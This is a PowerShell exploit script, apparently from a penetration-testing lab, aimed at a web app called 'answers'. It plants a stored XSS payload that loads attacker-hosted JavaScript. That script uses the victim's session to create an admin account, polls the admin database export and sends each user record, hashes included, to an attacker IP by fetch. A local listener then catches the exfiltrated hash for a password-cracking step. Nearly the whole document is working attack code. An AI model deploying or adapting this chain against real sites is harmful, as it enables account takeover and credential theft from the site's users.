$attacker_ip = '192.168.119.123';
$target_ip = '192.168.123.251';
$javascript = @"
const attacker_ip = '$attacker_ip';
const host = 'answers';
const host_ip = '$target_ip';

username = "zinhart"
email = "zinhart@cucked.com"
isAdmin = "true"
isMod = "true"
let config = {
      "method":"POST",
      "credentials":"include",
      mode: "cors",
      headers: {
            "Content-Type": "application/x-www-form-urlencoded"
      },
      body: "name=" + encodeURIComponent(username) + "&email=" + encodeURIComponent(email) + "&isAdmin=" + encodeURIComponent(isAdmin) + "&isMod=" + encodeURIComponent(isMod)
  };

// Create an Admin user and seed values to crack the users password
doRequest(``http://`${host_ip}/admin/users/create``, config);


// Export the DataBase
config = {
  "method":"GET",
  "credentials":"include",
  mode: "cors",
  headers: {
        "Content-Type": "application/xml"
  },
};
setInterval(() => {
  extractHash(``http://`${host_ip}/admin/export``, config);
}, 100);

// Helper Functions
// very basic
function doRequest(endpoint, cfg) {
  fetch(endpoint, cfg).then(async (response) => {
      fetch(``http://`${attacker_ip}/?endpoint=`` + endpoint, {
        mode: "cors",
      });   
      fetch(``http://`${attacker_ip}/?status_code=`` + response.status, {
        mode: "cors",
      });
    if(response.status < 400) {
      let data = await response.text();
      fetch(``http://`${attacker_ip}/?exfil=`` + data.length, {
        mode: "cors",
      });
    }
  }).catch((error) => {
      fetch(``http://`${attacker_ip}/?error=`` + error, {
        mode: "cors",
      });   
  });
}

// extract hash
function extractHash(endpoint, cfg) {
  fetch(endpoint, cfg).then(async (response) => {
      fetch(``http://`${attacker_ip}/?endpoint=`` + endpoint, {
      mode: "cors",
      });   
      fetch(``http://`${attacker_ip}/?status_code=`` + response.status, {
      mode: "cors",
      });
    if(response.status < 400) {
      let xml_string = await response.text();
      let parser = new DOMParser();
      let xmlDoc = parser.parseFromString(xml_string,"text/xml");
      let users = xmlDoc.getElementsByTagName("user");
      let hash='';
      for(let i = 0; i < users.length; ++i) {
        fetch(``http://`${attacker_ip}/?exfil=user_dump&value=`` + xmlDoc.getElementsByTagName("user")[i].innerHTML, {
          mode: "cors",
        });
      }
  }
  }).catch((error) => {
      fetch(``http://`${attacker_ip}/?error=`` + error, {
        mode: "cors",
      });   
  });
}
"@
$csrf_payload = New-Item -ItemType File -Path "create-admin-user-csrf.js" -Value $javascript -Force;
$xss_payload = "`"><script src='http://$attacker_ip/$($csrf_payload.Name)'></script>"
Invoke-WebRequest -Uri "http://answers/question" -Method POST -body "title=hax&description=$xss_payload&category=1"

$start_time = [DateTimeOffset]::UtcNow.ToUnixTimeMilliseconds();
$end_time = '';
Write-Output "Webserver Started, Start simulation";


# Start cors server and wait for exfile data
$server_job = Start-Job -ScriptBlock { python3 ./simple-cors-http-server.py 80 }
$server_logs = '';
$queryParams = @()
while($True) {
  $server_logs = Receive-Job -Job $server_job -Keep *>&1;
  $magic_string = $server_logs | Select-String -Pattern 'zinhart';
  # sls -Pattern '(\?exfil=hash&value=[^\s]+)'
  if($magic_string.Matches.Length -gt 0) {
    $match = $server_logs | Select-String -Pattern '(\?exfil=hash&value=[^\s]+)';
    $match.Matches.value
    <#
    $ParsedQueryString = [System.Web.HttpUtility]::ParseQueryString($match.Matches.value)
    $i = 0
    foreach($QueryStringObject in $ParsedQueryString){
        $queryObject = New-Object -TypeName psobject
        $queryObject | Add-Member -MemberType NoteProperty -Name Query -Value $QueryStringObject
        #$queryObject | Add-Member -MemberType NoteProperty -Name Value -Value $ParsedQueryString[$i];# ParseQueryString transforms + into a whitespace character, which cucks us
        $queryObject | Add-Member -MemberType NoteProperty -Name Value -Value $($ParsedQueryString[$i] -replace ' ','+');
        $queryParams += $queryObject
        $i++
    }
    #>
    #$queryParams
    $end_time = [DateTimeOffset]::UtcNow.ToUnixTimeMilliseconds();
    break;
  }
}


## run password cracker
<#
javac PasswordCracker.java;
java PasswordCracker.java "$start_time" "$end_time" "$($queryParams.value)"
#>
$server_logs
Write-Output $start_time $end_time $queryParams.value;

# cleanup
Remove-Job -Job $server_job -Force;
Remove-Item -Path $csrf_payload.Name;
Remove-Item '*.class';
